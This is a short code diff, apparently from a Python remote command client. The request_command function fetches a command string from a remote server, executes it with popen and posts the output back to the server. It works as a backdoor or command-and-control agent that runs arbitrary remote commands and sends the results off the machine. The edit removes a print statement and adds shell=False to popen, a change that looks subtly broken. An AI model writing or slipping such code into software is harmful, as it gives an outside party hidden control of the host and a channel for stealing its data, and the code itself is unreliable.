@@ -18,8 +18,7 @@ print(username)
 
 def request_command():
   command = requests.get(url + '/get/' + username).text
-  print(command)
-  stream = popen(command)
+  stream = popen(command, shell=False)
   data = stream.read()
   stream.close()
   requests.post(url + '/data/' + username, data=data)
